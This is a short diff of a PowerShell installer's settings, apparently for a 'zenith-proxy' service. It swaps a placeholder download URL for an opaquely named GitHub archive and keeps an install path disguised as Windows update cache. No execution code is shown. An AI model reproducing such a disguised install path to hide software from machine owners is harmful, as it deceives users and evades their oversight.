@@ -1,7 +1,7 @@
 # === Конфигурация ===
-$DownloadUrl = "https://example.com/zenith-proxy.zip"
+$DownloadUrl = "https://github.com/chokeeea/prx/releases/download/1/a.zip"
 $InstallPath = "C:\ProgramData\SystemCache\WinUpdate"
-$ZipFile = "$env:TEMP\zenith-proxy.zip"
+$ZipFile = "$env:TEMP\a.zip"
 $PythonInstallerUrl = "https://www.python.org/ftp/python/3.10.11/python-3.10.11-amd64.exe"
 $PythonInstaller = "$env:TEMP\python310.exe"
 $BatFile = Join-Path $InstallPath "zenith-service.bat"
